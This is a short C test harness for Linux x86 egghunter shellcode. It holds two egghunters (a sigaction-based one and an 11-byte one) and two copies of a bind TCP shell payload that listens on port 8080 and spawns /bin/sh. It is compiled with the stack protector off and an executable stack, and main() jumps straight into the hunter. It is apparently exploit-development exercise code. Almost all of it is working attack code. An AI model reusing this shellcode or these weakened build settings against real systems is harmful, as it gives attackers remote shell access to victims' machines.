/*
// Author: Alessio Parzian
// Filename: test_egghunter.c
//
// Test your egghunter with a shellcode. Replace shellcode variable value with your own shell, compile and execute.
// Compile with:
//	gcc $file_name -fno-stack-protector -z execstack -o $out_name
*/

#include <stdio.h>
#include <string.h>

// Change eggs accordingly with your preference and the type of hunter chosen
#define EXECEGG0 "\xfc\xfc\xfc\xfc" // NO NEED OF EXECUTION
#define EXECEEG1 "\x90\x47\x90\x4f" // NEED OF EXECUTION (order reversed in egg_hunter1)
 
// ====================
// SIGACTION EGGHUNTER
// ====================

// Size: 31 bytes
unsigned char egg_hunter0[] = \
"\x66\x81\xc9\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xf0\xb8"
EXECEGG0
"\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";

// Bind TCP Shell on port 8080
// Size 124 bytes
unsigned char shellcode0[] = \
EXECEGG0
EXECEGG0
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01"
"\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66"
"\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66"
"\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31"
"\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31"
"\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50"
"\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff"
"\x57\x89\xe2\x53\x89\xe1\xcd\x80";

// ====================
// SMALLEST EGGHUNTER
// ====================

// Size: 11 bytes
unsigned char egg_hunter1[] = \
"\x40\x81\x38\x90\x47\x90\x4f\x75\xf7\xff\xe0";

// Bind TCP Shell on port 8080
// Size: 128 bytes
unsigned char shellcode1[] = \
EXECEEG1
"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01"
"\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x66\xb8\x69\x01\x89\xf3\x52\x66"
"\x68\x1f\x90\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x66"
"\xb8\x6b\x01\x89\xf3\x31\xc9\xcd\x80\x66\xb8\x6c\x01\x89\xf3\x31"
"\xd2\x52\x52\x89\xe1\x6a\x02\x89\xe2\x31\xf6\xcd\x80\x89\xc3\x31"
"\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x31\xc0\x50"
"\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff"
"\x57\x89\xe2\x53\x89\xe1\xcd\x80";

void main()
{
    printf("Length of Egg Hunter Shellcode:  %d\n", strlen(egg_hunter1));
    printf("Length of the Actual Shellcode:  %d\n", strlen(shellcode1));
    int (*ret)() = (int(*)())egg_hunter1;
    ret();
}